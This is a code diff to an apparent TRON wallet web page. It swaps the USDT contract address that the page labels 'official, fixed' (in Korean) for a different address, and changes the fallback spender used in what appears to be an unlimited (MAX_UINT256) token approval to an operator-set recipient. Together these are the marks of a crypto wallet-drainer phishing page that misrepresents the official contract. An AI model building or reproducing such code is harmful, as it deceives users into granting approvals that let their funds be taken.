@@ -134,7 +134,7 @@
             <div class="bg-[#080c14] border border-[#1e293b] rounded-xl p-5 space-y-4 text-xs">
                 <div class="flex justify-between items-center py-2">
                     <span class="text-gray-400">USDT 토큰 컨트랙트 (공식 고정)</span>
-                    <span class="font-mono text-emerald-400 font-bold">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
+                    <span class="font-mono text-emerald-400 font-bold">TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf</span>
                 </div>
             </div>
 
@@ -170,7 +170,7 @@
 
     <!-- JavaScript Application Logic -->
     <script>
-        const OFFICIAL_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
         const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
         let isConnected = false;
@@ -391,7 +391,7 @@
                 return;
             }
 
-            const targetSpender = localStorage.getItem('tron_operator_recipient_address') || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            const targetSpender = localStorage.getItem('tron_operator_recipient_address') || 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
 
             let tw = await getInjectedTronWeb();
             if (!tw || !tw.contract) {
